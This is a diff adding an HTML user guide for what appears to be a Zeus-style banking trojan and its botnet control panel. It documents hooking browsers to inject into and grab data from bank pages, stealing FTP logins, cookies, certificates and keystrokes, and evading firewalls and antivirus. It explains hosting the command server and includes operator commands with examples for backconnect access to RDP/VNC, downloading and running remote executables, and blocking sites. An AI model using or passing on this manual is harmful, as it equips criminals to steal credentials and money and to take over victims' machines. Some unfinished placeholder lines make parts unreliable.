@@ -1,0 +1,860 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru">
+<head>
+  <title>User guide</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251"/>
+  <meta http-equiv="Content-Style-Type" content="text/css"/>
+  <meta http-equiv="Content-Script-Type" content="text/javascript"/>
+  <style type="text/css">
+  html, body
+  {
+    background:  #FFFFFF;
+    color:       #000000;
+    font-family: Verdana, Helvetica, sans-serif;
+    font-size:   12px
+  }
+  a
+  {
+    color: #0060B6
+  }
+  a:hover
+  {
+    color: #174C7E
+  }
+  h1, h2
+  {
+    padding:       2em 0 0.5em 0;
+    border-bottom: solid 1px #CCCCCC
+  }
+  h1
+  {
+    padding-top: 0
+  }
+  table.list, table.samples, table.parameters
+  {
+    border-collapse: collapse
+  }
+  table.list td, table.samples td, table.parameters td
+  {
+    padding:    1em;
+    background: #EEEEEE;
+    border:     1px solid #CCCCCC
+  }
+  </style>
+</head>
+<body>
+
+<h1>User guide</h1>
+<ul>
+  <li><a href="#description_bot">Description</a>
+    <ul>
+      <li><a href="#description_bot">Bot</a></li>
+      <li><a href="#description_cp">Control panel</a></li>
+    </ul>
+  </li>
+  <li><a href="#config_hi">Configuration file</a>
+    <ul>
+      <li><a href="#config_hi">HTTP-inject/HTTP-grabber</a></li>
+    </ul>
+  </li>
+  <li><a href="#cp_server">Control panel</a>
+    <ul>
+      <li><a href="#cp_server">Configuring the server</a></li>
+      <li><a href="#cp_install">Install</a></li>
+      <li><a href="#cp_update">Update</a></li>
+      <li><a href="#cp_fsarc">File /system/fsarc.php</a></li>
+      <li><a href="#cp_remotescript_commands">Commands with remote scripts</a></li>
+    </ul>
+  </li>
+  <li><a href="#bc">Work with Backconnect-server</a></li>
+  <li><a href="#faq">F.A.Q.</a></li>
+  <li><a href="#history">Version history</a></li>
+</ul>
+
+<!-- НАЧАЛО: Описание: Бот -->
+<h2 id="description_bot">Description: Bot</h2>
+<ul>
+  <li>
+    <p><b>Language and IDE programming:</b></p>
+    <p>Visual C++ (current version 9.0). No additional libraries are used (crtl, mfc, etc.).</p>
+  </li>
+  <li>
+    <p><b>Supported OS:</b></p>
+    <p>XP/Vista/Seven, as well as 2003/2003R2/2008/2008R2. Included work under Windows x64, but only for 32-x bits processes. Also retained full bot work under active "Terminal Servers" sessions.</p>
+  </li>
+  <li>
+    <p><b>Action principle:</b></p>
+    <p>Bot is based on intercepting WinAPI, by splicing in ring3 (user mode), by running a copy of its code in each process of the user (without using DLL).</p>
+  </li>
+  <li>
+    <p><b>Installation process:</b></p>
+    <p>At the moment, the bot is primarily designed to work under Vista/Seven, with enabled UAC, and without the use of local exploits. Therefore the bot is designed to work with minimal privileges (including the user "Guest"), in this regard the bot is always working within sessions per user (from under which you install the bot.). Bot can be set for each use in the OS, while the bots will not know about eachother. When you run the bot as "LocalSystem" user it will attempt to infect all users in the system.</p>
+    <p>When you install, bot creates its copy in the user's home directory, this copy is tied to the current user and OS, and cannot be run by another user, or even more OS. The original copy of the same bot (used for installation), will be automatically deleted, regardless of the installation success.</p>
+  </li>
+  <li>
+    <p><b>The session with the server (control panel):</b></p>
+    <p>Session with the server through a variety of processes from an internal "white list" that allows you to bypass most firewalls. During the session, the bot can get the configuration to send the accumulated reports, report their condition to the server and receive commands to execute on the computer. The session takes place via HTTP-protocol, all data sent by a bot and received from the server is encrypted with a unique key for each botnet.</p>    
+  </li>
+  <li>
+    <p><b>Protection:</b></p>
+    <ol>
+      <li>Unique names of all objects (files, MUTEXes, registry keys) when creating a bot for every user and a botnet.</li>
+      <li>Fixed bot can not be run with a different operating system or user. Destroys the code that is used to install the bot.</li>
+      <li>At the moment not done to hide bot files through WinAPI, because anti-virus tools are very easy to find such a file, and allow to pinpoint the location of the bot.</li>
+      <li>Autoupdate bot, do not require a reboot.</li>
+      <li>Monitoring the integrity of files the bot.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Server-side bot functions:</b></p>
+    <ol>
+      <li>Socks 4/4a/5 server with support for UDP and IPv6.</li>
+      <li>Backconnect for any service (RDP, Socks, FTP, etc.) on the infected machine. I.e. may gain access to a computer that is behind a NAT, or, for example, which has prohibited connections by a firewall. For this feature to work there are used additional applications that run on any Windows-server on the Internet, which has a dedicated IP.</li>
+      <li>Getting a screenshot of your desktop in real time.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Intercepting HTTP/HTTPS-requests from wininet.dll (Internet Explorer, Maxton, etc.), nspr4.dll (Mozilla Firefox) libraries:</b></p>
+    <ol>
+      <li>Modification of the loaded pages content (HTTP-inject).</li>
+      <li>Transparent pages redirect (HTTP-fake).</li>
+      <li>Getting out of the page content the right pieces of data (for example the bank account balance).</li>
+      <li>Temporary blocking HTTP-injects and HTTP-fakes.</li>
+      <li>Temporary blocking access to a certain URL.</li>
+      <li>Blocking logging requests for specific URL.</li>
+      <li>Forcing logging of all GET requests for specific URL.</li>
+      <li>Creating a snapshot of the screen around the mouse cursor during the click of buttons.</li>
+      <li>Getting session cookies and blocking user access to specific URL.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Get important information from the user programs:</b></p>
+    <ol>
+      <li>Logins from FTP-clients: FlashFXP, CuteFtp, Total Commander, WsFTP, FileZilla, FAR Manager, WinSCP, FTP Commander, CoreFTP, SmartFTP.</li>
+      <li>"Cookies" Adobe (Macromedia) Flash Player.</li>
+      <li>"Cookies" wininet.dll, Mozilla Firefox.</li>
+      <li>Import certificates from the certificate store Windows. And tracking their subsequent addition.</li>
+      <li>Tracking of pressing the keyboard keys.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Traffic sniffer for TCP protocol in Windows Socket.</b></p>
+    <ol>
+      <li>Intercept FTP-logins on any port.</li>
+      <li>Intercept POP3-logins on any port.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Miscellaneous:</b></p>
+    <ol>
+      <li>Execution of scripts (commands), created in the control panel.</li>
+      <li>Separation of the botnet to subbotnets (by name).</li>
+    </ol>
+  </li>
+ </ul>
+<!-- КОНЧАЛО: Описание: Бот -->
+
+<!-- НАЧАЛО: Описание: Панель управления -->
+<h2 id="description_cp">Description: Control panel</h2>
+<ul>
+  <li>
+    <p><b>Programming language:</b></p>
+    <p>PHP, using the extensions mbstring, mysql.</p>
+  </li>
+  <li>
+    <p><b>Display statistics:</b></p>
+    <ol>
+      <li>Number of infected computers.</li>
+      <li>Current number of bots in the online.</li>
+      <li>The number of new bots.</li>
+      <li>Daily activity of bots.</li>
+      <li>Country statistics.</li>
+      <li>Statistics by OS.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Working with the list of bots:</b></p>
+    <ol>
+      <li>Filtering the list by country, botnets, IP-addresses, NAT-status, etc.</li>
+      <li>Displaying desktop screenshots in real time (only for bots outside NAT).</li>
+      <li>Mass inspection of the Socks-servers state.</li>
+      <li>Displays detailed information about the bots. Of the most important here are:
+        <ul>
+          <li>Windows version, user language and time zone.</li>
+          <li>Location and computer IP-address (not for local).</li>
+          <li>Internet connection speed (measured by calculating the load time of a predetermined HTTP-resource).</li>
+          <li>The first and last time of communication with the server.</li>
+          <li>Time in online.</li>
+        </ul>
+      <li>Ability to set comment for each bot.</li>
+    </ol>
+  </li>
+  <li>
+    <p><b>Scripts (commands):</b></p>
+    <p>You can control the bots by creating a script for them. Currently, syntax and scripting capabilities, are very primitive.</p>
+  </li>
+  <li>
+    <p><b>Working with reports (logs) and bots files:</b></p>
+    <p>Files (such as screenshots, Flash Player cookies) received from the bots are always written to files on the server. You get the opportunity to search for files with a filter: by bots, botnets, content and file name.</p>
+    <p>Reports can be written in files (%botnet%/%bot_id%/reports.txt), and in the database. In the first case, the search for records is in exactly the same way as for files. In the second case, you get more flexible filtering, and viewing reports from the Control panel.</p>
+  </li>
+  <li>
+    <p><b>Receive notifications in the IM (Jabber):</b></p>
+    <p>You can receive notifications from the Control Panel in the Jabber-account.</p>
+    <p>At the moment there is a possibility of receiving notifications about a user entering a defined HTTP/HTTPS-resources. For example, it is used to capture user session in an online bank.</p>
+  </li>
+  <li>
+    <p><b>Miscellaneous:</b></p>
+    <ol>
+      <li>Creating Control panel users with specific access rights.</li>
+      <li>Displays information about the server software.</li>
+      <li>Automatic recovery of damaged MyISAM tables.</li>
+    </ol>
+  </li>
+</ul>
+<!-- КОНЧАЛО: Описание: Панель управления -->
+
+<!-- НАЧАЛО: Описание: Файл конфигурации: HTTP-инжекты/HTTP-грабберы -->
+<h2 id="config_hi">Configuration file: HTTP-inject/HTTP-grabber.</h2>
+<p>For the convenience of writing, HTTP-inject/HTTP-grabber are recorded in a separate file specified in the configuration file as "DynamicConfig.file_webinjects". Naturally, after creating the end-configuration file, not any additional files are generated.</p>
+<p>The file consists of a list of URLs for which you can specify an unlimited number of any modification thereto or derived from their data. The current URL is the following line:<p>
+<p><b>set_url [url] [options] [postdata_blacklist] [postdata_whitelist] [url_block] [matched_context]</b></p>
+<p><b>Parameters:</b></p>
+<table class="parameters">
+  <tr>
+    <td>url</td>
+    <td>URL, on which must be run HTTP-inject/HTTP-grabber. Allowed the use of masks (* and # symbols).</td>
+  </tr>
+  <tr>
+    <td>options</td>
+    <td>
+      Defines basic terms and conditions for the records, consists of a combination of the following characters:
+      <ul>
+        <li><b>P</b> - runs at <a target="_blank" href="http://en.wikipedia.org/wiki/GET_(HTTP)#Request_methods">POST-request</a>.</li>
+        <li><b>G</b> - runs at <a target="_blank" href="http://en.wikipedia.org/wiki/GET_(HTTP)#Request_methods">GET-request</a>.</li>
+        <li><b>L</b> - if this symbol is specified, then starts going as HTTP-grabber, if not specified, goes as HTTP-inject.
+        <li><b>D</b> - blocks run more than once in 24 hours. <u>This symbol requires a mandatory presence of the parameter url_block.</u></li>
+        <li><b>F</b> - complements the symbol "L", allows you to record the result not in the full report but as a separated file "grabbed\%host%_%year%_%month%_%day%.txt".</li>
+        <li><b>H</b> - complements the symbol "L", saves the contents without stripping the HTML-tags. In normal mode the same, all HTML-tags are removed, and some are transformed into a character "new line" or "gap".</li>
+        <li><b>I</b> - compare the url parameter insensitive (only for engl. alphabet).</li>
+        <li><b>C</b> - compare the context insensitive (only for engl. alphabet).</li>
+      </ul>    
+    </td>
+  </tr>
+  <tr>
+    <td>postdata_blacklist</td>
+    <td>Complete (from beginning to end) the contents of POST-data, which <b>should not</b> be run. Allowed the use of masks (* and ? symbols).</br></br>Parameter is optional.</td>
+  </tr>
+  <tr>
+    <td>postdata_whitelist</td>
+    <td>Full (from beginning to end) content POST-data, which <b>should</b> be run. Allowed the use of masks (* and ? symbols).</br></br>Parameter is optional.</td>
+  </tr>
+  <tr>
+    <td>url_block</td>
+    <td>
+      <b>In the absence of the symbol "D" in the options parameter:</b>
+      <p>If the run must occur only once, then should be specified a URL, in this case the further run will be blocked. Expects that URL to begin immediately after HTTP-inject/HTTP-grabber application. If, after blocking will need rerun, then the lock can be removed via the command "<a href="#bot_httpinject_enable">bot_httpinject_enable</a>" with a parameter, for example, equal to the parameter url.</p>      
+      <b>In the presence of the symbol "D" in the options parameter:</b>
+      <p>You must specify a URL, when referring to that, run will be locked at 24-th hour. Expectats that the URL begins immediately after HTTP-inject/HTTP-grabber application. <u>This lock can not be removed by a command "bot_httpinject_enable".</u></p>
+      Parameter is optional in the absence of a symbol "D" in the options parameter.
+    </td>
+  </tr>
+  <tr>
+    <td>matched_context</td>
+    <td>Subcontent (substring) URL content, which should be run. Allows the use of masks (* and ? symbols).</br></br>Parameter is optional.</td>
+  </tr>
+</table>
+<p>With the next line begins a list of changes introduced in the contents of the URL, and if the symbol "L" is in the parameter options - a list of data is retrieved from the content URL. This list lasts until it reaches the end of the file, or is specified a new URL.</p><p>Unit list consists of three elements in random order:</p>
+<table class="parameters">
+  <tr>
+    <td>data_before</td>
+    <td>
+      <b>In the absence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, after which you want to enter new data.</p>
+      <b>In the presence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, after which you want to start to get data for the report.</p>
+      Allows the use of masks (* and ? symbols).
+    </td>
+  </tr>
+  <tr>
+    <td>data_after</td>
+    <td>
+      <b>In the absence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, to which you want to finish the new data.</p>
+      <b>In the presence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, after which the need to finish getting the data for the report.</p>
+      Allows the use of masks (* and ? symbols).
+    </td>
+  </tr>
+  <tr>
+    <td>data_inject</td>
+    <td>
+      <b>In the absence of the symbol "L" in the options parameter:</b>
+      <p>The new data, that will be inserted between data_before and data_after data.</p>
+      <b>In the presence of the symbol "L" in the options parameter:</b>
+      <p>Subcontent in the URL content, after which the need to finish getting the data for the report.</p>
+    </td>
+  </tr>
+</table>
+
+
+<p><b>Example:</b></p>
+<table class="samples">
+  <tr>
+    <td>user_homepage_set http://www.google.com/</td>
+    <td>Force setting the homepage as "http://www.google.com/".</td>
+  </tr>
+  <tr>
+    <td>user_homepage_set</td>
+    <td>Force setting the homepage will be disabled.</td>
+  </tr>
+</table>
+LIMITS
+LOGIC FOR INCOMPLETE before or after
+
+
+
+<!-- КОНЧАЛО: Описание: Файл конфигурации: HTTP-инжекты/HTTP-грабберы -->
+
+<!-- НАЧАЛО: Панель управления: Настройка сервера -->
+<h2 id="cp_server">Control panel: Server configuration</h2>
+<p>The server is the central point of control the botnet, it is engaged in collecting reports of bots and command bots. It is not recommended to use "Virtual Hosting" or "VDS", as with an increase in the botnet, the server will increase, and this kind of web hosting quickly exhaust its resources. You need a "Dedicated Server" (Ded), the recommended minimum configuration:</p>
+<ul>
+  <li>2Gb RAM.</li>
+  <li>2x 2GHz processor speed.</li>
+  <li>Separate hard drive for the database.</li>
+</ul>
+<p>For bot to work requires HTTP-server with PHP + Zend Optimizer attached, and MySQL-server.<br/><b>WARNING:</b> For Windows-based servers is very important to change (create) the following registry value: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\MaxUserPort=dword:65534 (decimal).</p>
+<ul>
+  <li>
+    <p><b>HTTP-server:</b></p>
+    <p>As an HTTP-server is recommended to use: for nix-system - Apache from version 2.2, for Windows-servers - IIS from version 6.0. It is recommended to keep the HTTP-server on port 80 or 443 (a positive effect on bot run, as providers/proxy can block access to some non-standard ports).</p>
+    <p>Download Apache: <a href="http://apache.org/dyn/closer.cgi">http://apache.org/dyn/closer.cgi</a>.<br/>IIS website: <a href="http://www.iis.net/">http://www.iis.net/</a>.</p>
+  </li>
+  <li>
+    <p><b>PHP interpreter:</b></p>
+    <p>The latest version of the control panel was developed on PHP 5.2.6. Therefore, it is highly recommended to use version, at least this version.</p>
+    <p>It is important to make the following settings php.ini:</p>
+    <ul>
+      <li>safe_mode = Off</li>
+      <li>magic_quotes_gpc = Off</li>
+      <li>magic_quotes_runtime = Off</li>
+      <li>memory_limit = 256M  ;Or higher.</li>
+      <li>post_max_size = 100M ;Or higher.</li>
+    </ul>
+    <p>and also recommended that you change these settings:</p>
+    <ul>
+      <li>display_errors = Off</li>
+    </ul>
+    <p>Also need to enable the Zend Optimizer (acceleration of the script, and run protected scripts). Recommended version from 3.3.</p>
+    <p>Not recommended to connect PHP to the HTTP-server via CGI.</p>
+    <p>Download PHP: <a href="http://www.php.net/downloads.php">http://www.php.net/downloads.php</a>.<br/>Download Zend Optimizer: <a href="http://www.zend.com/en/products/guard/downloads">http://www.zend.com/en/products/guard/downloads</a>.</p>    
+  </li>
+  <li>
+    <p><b>MySQL-server:</b></p>
+    <p>MySQL is required to store all data about the botnet. The recommended version is not below 5.1.30, well worth considering, that when ran the control panel in the older versions were detected some problems. All table control panel, go to format MyISAM, it is important to optimize speed of work with this format, based on the available server resources.</p>
+    <p>Recommended the following changes to the settings MySQL-server (my OR my.ini):</p>
+    <ul>
+      <li>max_connections=2000 #Or higher</li>
+    </ul>
+    <p>Download MySQL: <a href="http://dev.mysql.com/downloads/">http://dev.mysql.com/downloads/</a>.</p>
+  </li>
+</ul>
+<!-- КОНЧАЛО: Панель управления: Настройка сервера -->
+
+<!-- НАЧАЛО: Панель управления: Установка -->
+<h2 id="cp_install">Control panel: Installation</h2>
+<p>Designation of files and folders:</p>
+<table class="list">
+  <tr><td>/install</td><td>installer</td></tr>
+  <tr><td>/system</td><td>system files</td></tr>
+  <tr><td>/system/fsarc.php</td><td><a href="#cp_fsarc">script to call an external archiver</td></tr>
+  <tr><td>/system/config.php</td><td>configuration file</td></tr>
+  <tr><td>/theme</td><td>theme files (design), without Zend, can freely change</td></tr>
+  <tr><td>cp.php</td><td>control panel entrance</td></tr>
+  <tr><td>gate.php</td><td>gate for bots</td></tr>
+  <tr><td>index.php</td><td>empty file to prevent listing of files</td></tr>
+</table>
+<p>The control panel is usually located in your distribution folder server[php]. All contents of this folder is for upload to the server in any location accessible via HTTP. If you upload it via FTP, all files must be uploaded in BINARY mode.</p>
+<p>For nix-systems set rights:</p>
+<table class="list">
+  <tr><td>/.</td><td>777</td></tr>
+  <tr><td>/system</td><td>777</td></tr>
+  <tr><td>/tmp</td><td>777</td></tr>
+</table>
+<p>For Windows-systems set rights:</p>
+<table class="list">
+  <tr><td>\system</td><td>rights to full rights for reading, writing for an unprivileged user which is used to access the files via HTTP. For IIS it is usually IUSR_*</td></tr>
+  <tr><td>\tmp</td><td>as well as for \system</td></tr>
+</table>
+<p>Once all files are uploaded and are set the rights, need to run in the browser the installer from URL http://server/directory/install/index.php. Follow the on-screen instructions, in case of errors (You will be notified in detail) in the installation process, check the entered data, and proper rights setting to the folder.</p>
+<p>After installing, is recommended to remove the install directory, and rename files cp.php (control panel entrance) and gate.php (gate for bots) to any files you like (the extension cannot be changed).</p>
+<p>Now you can safely enter into the control panel by typing in the browser URL the renamed file cp.php.</p>
+<!-- КОНЧАЛО: Панель управления: Установка -->
+
+<!-- НАЧАЛО: Панель управления: Обновление -->
+<h2 id="cp_update">Control panel: Update</h2>
+<p>If you have a newer copy of the control panel, and want to update an older version, you must do the following:</p>
+<ol>
+  <li>Copy the files of the new panel in place of the old.</li>
+  <li>Rename the files cp.php and gate.php under their real names you selected when you installed the old control panel.</li>
+  <li>Just in case, re-set the directories rights under <a href="#cp_install">this</a> section.</li>
+  <li>Run the installer throuh a browser URL http://сервер/директория/install/index.php, and follow the on-screen instructions. The process of the installer may take quite a long period of time, due to the fact that some of the tables with the reports can be recreated.</li>
+  <li>You can use the new control panel.</li>
+</ol>
+<!-- КОНЧАЛО: Панель управления: Обновление -->
+
+<!-- НАЧАЛО: Панель управления: Файл /system/fsarc.php. -->
+<h2 id="cp_fsarc">Control panel: The file /system/fsarc.php.</h2>
+<p>This file contains a function to call an external archiver. Currently, data logger is used only in the module "Reports::Find in files" (reports_files), and calls to download files and folders in a single archive. By default, configured to Zip archiver, and is universal for both Windows and nix, so all you have to do, is to install into the system this archiver, and give the right to its execution. You can also edit this file to work with any archiver.</p>
+<p>Download Zip: <a href="http://www.info-zip.org/Zip.html">http://www.info-zip.org/Zip.html</a>.</p>
+<!-- КОНЧАЛО: Панель управления: Файл /system/fsarc.php. -->
+
+<!-- НАЧАЛО: Панель управления: Команды, используемые в скриптах -->
+<h2 id="cp_remotescript_commands">Control panel: Commands, used in scripts</h2>
+<ul>
+  <li><p><b>os_shutdown</b></p>
+    <p>Shutdown computer. This command will be executed after the execution of the script, regardless of position in the script.</p>
+  </li>
+
+  <li><p><b>os_reboot</b></p>
+    <p>Reboot computer. This command will be executed after the execution of the script, regardless of position in the script.</p>
+  </li>
+
+  <li><p><b>bot_uninstall</b></p>
+    <p>Complete removal of the bot from the current user. This command will be executed after the execution of the script, regardless of position in the script.</p>
+  </li>
+
+  <li><p><b>bot_update</b> [url]</p>
+    <p>Update the bot configuration file.</p>
+    <p><b>Parameters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>url</td>
+        <td>
+          URL, from which to load configuration file. In the case of a successful configuration download, from it will be forced to load and run the file (with parameter "-f"), specified in the "DynamicConfig.url_loader".<br/><br/>
+          If this option is not specified or is blank, it will download the configuration file as usual (i.e. as whether it was time to "StaticConfig.timer_config"), with all its consequences.
+        </td>
+      </tr>
+    </table>
+    <p><b>Example:</b></p>
+    <table class="samples">
+      <tr>
+        <td>bot_update http://domain/update.bin</td>
+        <td>Downloads the configuration file "http://domain/update.bin".</td>
+      </tr>
+    </table>
+  </li>
+
+  <li id="bot_bc_add"><p><b>bot_bc_add</b> [service] [backconnect_server] [backconnect_server_port]</p>
+    <p>Adding a constant (the session will be restored even after restarting the computer) backconnect-session. This command is not available in all builds of the software.</i></p>
+    <p><b>Parameters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>service</td>
+        <td>Port number or service name for which to create session.</td>
+      </tr>
+      <tr>
+        <td>backconnect_server</td>
+        <td>Host that is running backconnect-server.</td>
+      </tr>
+      <tr>
+        <td>backconnect_server_port</td>
+        <td>The port number on the host [backconnect_server].</td>
+      </tr>
+    </table>
+    <p><b>Examples:</b></p>
+    <table class="samples">
+      <tr>
+        <td>bot_bc_add socks 192.168.100.1 4500</td>
+        <td>You get access to Socks-server.</td>
+      </tr>
+      <tr>
+        <td>bot_bc_add 3389  192.168.100.1 4500</td>
+        <td>You get access to RDP.</td>
+      </tr>
+	   <tr>
+        <td>bot_bc_add vnc  192.168.100.1 4500</td>
+        <td>You get access to VNC.</td>
+      </tr>
+    </table>
+  </li>
+
+  <li id="bot_bc_remove"><p><b>bot_bc_remove</b> [service] [backconnect_server] [backconnect_server_port]</p>
+    <p>Termination of the permanent backconnect-sessions. <i>This command is not available in all builds of software.</i></p>
+    <p><b>Parameters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>service</td>
+        <td>Port number or service name, for which the session is removed. Allows the use of masks (* and ? symbols), to remove the sessions group.</td>
+      </tr>
+      <tr>
+        <td>backconnect_server</td>
+        <td>Host, that is running backonnect-server. Allows the use of masks (* and ? symbols), to remove the sessions group.</td>
+      </tr>
+      <tr>
+        <td>backconnect_server_port</td>
+        <td>Port number on the host [backconnect_server]. Allows the use of masks (* and ? symbols), to remove the sessions group.</td>
+      </tr>
+    </table>
+    <p><b>Examples:</b></p>
+    <table class="samples">
+      <tr>
+        <td>bot_bc_remove socks * *</td>
+        <td>Deletes all sessions associated with the socks service.</td>
+      </tr>
+      <tr>
+        <td>bot_bc_remove * * *</td>
+        <td>Deletes all existing sessions.</td>
+      </tr>
+    </table>
+  </li>
+  <li><p><b>bot_httpinject_disable</b> [url_1] [url_2] ... [url_X]</p>
+    <p>Blocking execution of HTTP-injects to a specific URL for the current user. <u>Calling this command does not reset the current block list, but rather complements it.</u></p>
+    <p><b>Parameters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>url_1, ulr_2, ...</td>
+        <td>URL's, in which you want to block execution of HTTP-injects. Allows the use of masks (* and # symbols).</td>
+      </tr>
+    </table>
+    <p><b>Examples:</b></p>
+    <table class="samples">
+      <tr>
+        <td>bot_httpinject_disable http://www.google.com/*</td>
+        <td>Blocks execution of HTTP-injects for http://www.google.com/.</td>
+      </tr>
+      <tr>
+        <td>bot_httpinject_disable *</td>
+        <td>Blocks execution of HTTP-injects for each URL.</td>
+      </tr>
+      <tr>
+        <td>bot_httpinject_disable *.html *.gif</td>
+        <td>Blocks execution of HTTP-injects for files with the html and gif.</td>
+      </tr>
+    </table>
+  </li>
+
+  <li id="bot_httpinject_enable"><p><b>bot_httpinject_enable</b> [url_1] [url_2] ... [url_X]</p>
+    <p>Unlock execution of HTTP-injects to a specific URL for the current user.</p>
+    <p><b>Parameters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>url_1, ulr_2, ...</td>
+        <td>Masks (* and # symbols), on which from the list of blocked URL you want to remove the URL.</td>
+      </tr>
+    </table>
+    <p><b>Examples:</b></p>
+    <table class="samples">
+      <tr>
+        <td>bot_httpinject_enable *.google.*</td>
+        <td>Remove blocking execution of HTTP-injects in any URL from the block list, which contains in it ".google.".</td>
+      </tr>
+      <tr>
+        <td>bot_httpinject_enable *</td>
+        <td>Clear completely the list of block execution of HTTP-injects.</td>
+      </tr>
+      <tr>
+        <td>bot_httpinject_enable *.html https://*</td>
+        <td>Remove blocking execution of HTTP-injects with all html-files, and to all HTTPS-resources.</td>
+      </tr>
+    </table>
+  </li>
+<!--
+  <li><p><b>fs_path_get</b></p>
+  </li>
+
+  <li><p><b>fs_search_add</b></p>
+  </li>
+
+  <li><p><b>fs_search_remove</b></p>
+  </li>
+
+  <li><p><b>user_destroy</b></p>
+  </li>
+-->
+  <li><p><b>user_logoff</b></p>
+    <p>Session termination (logoff) of current user. This command will be executed after the execution of the script, regardless of position in the script.</p>
+  </li>
+
+  <li><p><b>user_execute</b> [path] [parameters]</p>
+    <p>Start the process from the current user. Start process through ShellExecuteW(,NULL,,,,), if start failed, then the process is created through CreateProcessW.</p>
+    <p><b>Parameters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>path</td>
+        <td>
+          Local path or URL. Can be specified as an executable file (exe), as well as any other extension (doc, txt, bmp, etc.). For a successfull launch of a <u>not executable</u> file (not exe), that must be associated with some program.<br/><br/>
+          If the parameter is a local path, then is usually the creation process. You may use "environment variables".<br/><br/>
+          If the parameter is a URL, the URL gets downloaded to a file "%TEMP%\random_name\file_name", where random_name - arbitrary folder name, and file_name - resource name of the last part of URL-path (if the URL-path ends in a slash, then could throw an error). Currently is permitted to use only the HTTP and HTTPS protocols, also is recommended that URL-path is URL-encoded (true for non-English characters, the details are in RFC 1630 and 1738).
+        </td>
+      </tr>
+      <tr>
+        <td>parameters</td>
+        <td>Arbitrary parameters passed to the process (not processed by the bot). Are not mandatory.</td>
+      </tr>
+    </table>
+    <p><b>Examples:</b></p>
+    <table class="samples">
+      <tr>
+        <td>user_execute http://www.google.com/dave/superdocumet.doc</td>
+        <td>Download the file in "%TEMP%\random_name\superdocumet.doc", and execute it, for example via MS Word.</td>
+      </tr>
+      <tr>
+        <td>user_execute http://www.google.com/dave/killer.exe /KILLALL /RESTART</td>
+        <td>Download the file in "%TEMP%\random_name\killer.exe", and execute it with "/KILALL /RESTART" parameters.</td>
+      </tr>
+      <tr>
+        <td>user_execute "%ProgramFiles%\Windows Media Player\wmplayer.exe"</td>
+        <td>Launch media-player.</td>
+      </tr>
+      <tr>
+        <td>user_execute "%ProgramFiles%\Windows Media Player\wmplayer.exe" "analporno.wmv"</td>
+        <td>Launch a media-player with the parameter "analporno.wmv".</td>
+      </tr>
+    </table>
+  </li>
+
+  <li><p><b>user_cookies_get</b></p>
+    <p>Get the cookies of all known browsers.</p>
+  </li>
+
+  <li><p><b>user_cookies_remove</b></p>
+    <p>Delete all cookies from all known browsers.</p>
+  </li>
+
+  <li><p><b>user_certs_get</b></p>
+    <p>Get all the exported certificates from the certificate store "MY" of the current user. Certificates will be uploaded to the server as pfx-files with the password "pass".</p>
+  </li>
+
+  <li><p><b>user_certs_remove</b></p>
+    <p>Cleaning certificate store "MY" of the current user.</p>
+  </li>
+
+  <li><p><b>user_url_block</b> [url_1] [url_2] ... [url_X]</p>
+    <p>Block access to the URL in the famous libraries (browsers) for the current user. <u>Calling this command does not reset the current block list, but rather complements it.</u><br/><br/>
+    When you try to access blocked URL, the bot shows the following errors:</p>
+    <ul>
+      <li>wininet.dll - ERROR_HTTP_INVALID_SERVER_RESPONSE</li>
+      <li>nspr4.dll - PR_CONNECT_REFUSED_ERROR</li>
+    </ul>
+    <p><b>Parameters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>url_1, ulr_2, ...</td>
+        <td>URL's to which you want to block access. Allows the use of masks (* and # symbols).</td>
+      </tr>
+    </table>
+    <p><b>Examples:</b></p>
+    <table class="samples">
+      <tr>
+        <td>user_url_block http://www.google.com/*</td>
+        <td>Block access to any URL on http://www.google.com/.</td>
+      </tr>
+      <tr>
+        <td>user_url_block *</td>
+        <td>Complete blocking of access to any resource.</td>
+      </tr>
+      <tr>
+        <td>user_url_block http://*.ru/*.html https://*.ru/*</td>
+        <td>Block access to any html-file in the zone ru, and blocking access to HTTPS-resources in the zone ru.</td>
+      </tr>
+    </table>
+  </li>
+
+  <li><p><b>user_url_unblock</b> [url_1] [url_2] ... [url_X]</p>
+    <p>Unlock access to the URL in the famous libraries (browsers) for the current user.</p>
+    <p><b>Parameters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>url_1, ulr_2, ...</td>
+        <td>Masks (* and # symbols), on which from the list of blocked URL you want to remove URL.</td>
+      </tr>
+    </table>
+    <p><b>Examples:</b></p>
+    <table class="samples">
+      <tr>
+        <td>user_url_unblock *.google.*</td>
+        <td>Remove the lock on any URL from the block List, which contains ".google.".</td>
+      </tr>
+      <tr>
+        <td>user_url_unblock *</td>
+        <td>Clear the URL block list completely.</td>
+      </tr>
+      <tr>
+        <td>user_url_unblock *.html https://*</td>
+        <td>Remove the lock from all html-files, and blocks from all HTTPS-resources.</td>
+      </tr>
+    </table>
+  </li>
+  
+  <li><p><b>user_homepage_set</b> [url]</p>
+    <p>Forced change the home page for all known browsers of the current user. Even if the user tries to change the page, it will automatically be restored to the page specified by this command.</p>
+    <p><b>Paramaters:</b></p>
+    <table class="parameters">
+      <tr>
+        <td>url</td>
+        <td>
+          URL, which will be set as the home page.<br/><br/>
+          If this option is not specified or is blank, it will force to set off the homepage, but it will not restore the original page specified by the user. I.e. the bot will no longer impede change the home page.
+        </td>
+      </tr>
+    </table>
+    <p><b>Examples:</b></p>
+    <table class="samples">
+      <tr>
+        <td>user_homepage_set http://www.google.com/</td>
